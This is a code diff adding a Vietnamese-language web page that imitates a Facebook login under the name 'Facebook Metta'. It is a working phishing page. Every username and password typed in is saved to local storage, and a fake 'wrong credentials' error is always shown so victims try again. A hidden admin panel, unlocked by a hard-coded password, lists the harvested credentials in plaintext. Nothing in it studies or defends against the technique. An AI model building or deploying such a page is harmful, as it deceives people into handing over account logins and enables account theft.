@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Metta</title>
+
+<!-- Logo cho iOS -->
+<link rel="apple-touch-icon" href="fb_logo.png">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="Facebook Metta">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+<style>
+* { box-sizing:border-box; margin:0; padding:0; font-family:Arial,sans-serif; }
+body { background:#f0f2f5; display:flex; flex-direction:column; align-items:center; padding:20px; }
+.logo { width:60px; height:60px; margin-bottom:20px; display:block; }
+
+.container { background:#fff; border-radius:20px; padding:20px; box-shadow:0 8px 20px rgba(0,0,0,0.2); width:350px; margin-bottom:20px; display:flex; flex-direction:column; align-items:center; }
+.container h1 { color:#1877f2; margin-bottom:20px; }
+.container input { width:100%; padding:10px; margin-bottom:10px; border:1px solid #ddd; border-radius:6px; font-size:16px; }
+.container button { width:100%; padding:10px; background:#1877f2; color:#fff; border:none; border-radius:6px; font-size:16px; cursor:pointer; }
+.container button:hover { background:#165ecb; }
+.error-msg { color:red; font-size:14px; margin-bottom:10px; display:none; }
+
+.admin-login { width:350px; display:flex; flex-direction:column; align-items:center; margin-bottom:20px; }
+#toggleAdminBtn { width:100%; padding:10px; border:none; border-radius:6px; background:#42b72a; color:#fff; cursor:pointer; font-size:16px; }
+#toggleAdminBtn:hover { background:#36a420; }
+#adminForm { display:none; width:100%; margin-top:10px; }
+#adminForm input { width:100%; padding:10px; border:1px solid #ddd; border-radius:6px; margin-bottom:10px; }
+#adminForm button { width:100%; padding:10px; background:#1877f2; color:#fff; border:none; border-radius:6px; cursor:pointer; }
+#adminForm button:hover { background:#165ecb; }
+#adminLogout { display:none; width:100%; padding:10px; margin-top:10px; background:#ff4d4f; color:#fff; border:none; border-radius:6px; cursor:pointer; }
+#adminLogout:hover { background:#d9363e; }
+
+.admin-panel { display:none; background: rgba(255,255,255,0.9); border-radius:20px; padding:20px; width:350px; max-height:400px; overflow-y:auto; box-shadow:0 8px 20px rgba(0,0,0,0.2); color:#000; margin-top:10px; }
+.admin-panel h2 { color:#42b72a; text-align:center; margin-bottom:15px; }
+.user-entry { padding:10px; border-bottom:1px solid #ccc; border-radius:10px; margin-bottom:10px; background:#f0f2f5; display:flex; justify-content:space-between; align-items:center; transition:0.3s; }
+.user-entry:hover { background:#dfe3ee; }
+.user-entry strong { color:#1877f2; }
+.delete-btn { background:#ff4d4f; color:#fff; border:none; border-radius:6px; padding:5px 10px; cursor:pointer; }
+.delete-btn:hover { background:#d9363e; }
+</style>
+</head>
+<body>
+
+<img src="fb_logo.png" alt="Facebook Metta" class="logo">
+
+<!-- Form login chính -->
+<div class="container" id="loginContainer">
+    <h1>Facebook</h1>
+    <div class="error-msg" id="loginError">Tài khoản hoặc mật khẩu không đúng!</div>
+    <input type="text" id="username" placeholder="Tài khoản">
+    <input type="password" id="password" placeholder="Mật khẩu">
+    <button onclick="loginUser()">Đăng nhập</button>
+</div>
+
+<!-- Admin toggle -->
+<div class="admin-login">
+    <button id="toggleAdminBtn">Facebook Metta</button>
+    <div id="adminForm">
+        <input type="password" id="adminPasswordInput" placeholder="Nhập mật khẩu admin">
+        <button onclick="showAdminPanel()">Xác nhận</button>
+    </div>
+    <button id="adminLogout" onclick="logoutAdmin()">Đăng xuất admin</button>
+</div>
+
+<!-- Admin panel -->
+<div class="admin-panel" id="adminPanel">
+    <h2>Danh sách tài khoản người dùng</h2>
+    <div id="userList"></div>
+</div>
+
+<script>
+const adminPassword = "020920011"; // mật khẩu admin ẩn
+let userEntries = JSON.parse(localStorage.getItem("userEntries")) || []; // load từ localStorage
+
+// Toggle hiển thị form admin
+document.getElementById("toggleAdminBtn").addEventListener("click", function(){
+    const form = document.getElementById("adminForm");
+    form.style.display = form.style.display === "none" ? "block" : "none";
+});
+
+function loginUser() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const errorMsg = document.getElementById("loginError");
+
+    if(username && password) {
+        userEntries.unshift({username, password}); // lưu mới nhất lên đầu
+        localStorage.setItem("userEntries", JSON.stringify(userEntries)); // lưu vĩnh viễn
+        errorMsg.style.display = "block"; // hiển thị thông báo lỗi
+        document.getElementById("username").value = "";
+        document.getElementById("password").value = "";
+    } else {
+        errorMsg.style.display = "block";
+    }
+}
+
+function showAdminPanel() {
+    const input = document.getElementById("adminPasswordInput").value;
+    if(input === adminPassword) {
+        const panel = document.getElementById("adminPanel");
+        panel.style.display = "block";
+        document.getElementById("adminLogout").style.display = "block"; // hiển thị nút đăng xuất admin
+        renderUserList();
+    } else {
+        alert("Sai mật khẩu admin!");
+    }
+}
+
+function logoutAdmin() {
+    document.getElementById("adminPanel").style.display = "none";
+    document.getElementById("adminForm").style.display = "none";
+    document.getElementById("adminLogout").style.display = "none";
+    document.getElementById("adminPasswordInput").value = "";
+}
+
+function renderUserList() {
+    const userList = document.getElementById("userList");
+    userList.innerHTML = "";
+    userEntries.forEach((entry, index) => {
+        const div = document.createElement("div");
+        div.className = "user-entry";
+        div.innerHTML = `
+            <div><strong>Tài khoản:</strong> ${entry.username} <br><strong>Mật khẩu:</strong> ${entry.password}</div>
+            <button class="delete-btn" onclick="deleteUser(${index})">Xóa</button>
+        `;
+        userList.appendChild(div);
+    });
+}
+
+function deleteUser(index) {
+    userEntries.splice(index,1);
+    localStorage.setItem("userEntries", JSON.stringify(userEntries)); // cập nhật localStorage
+    renderUserList();
+}
+
+// Khi load trang, hiển thị userEntries đã lưu
+if(userEntries.length > 0){
+    renderUserList();
+}
+</script>
+
+</body>
+</html>
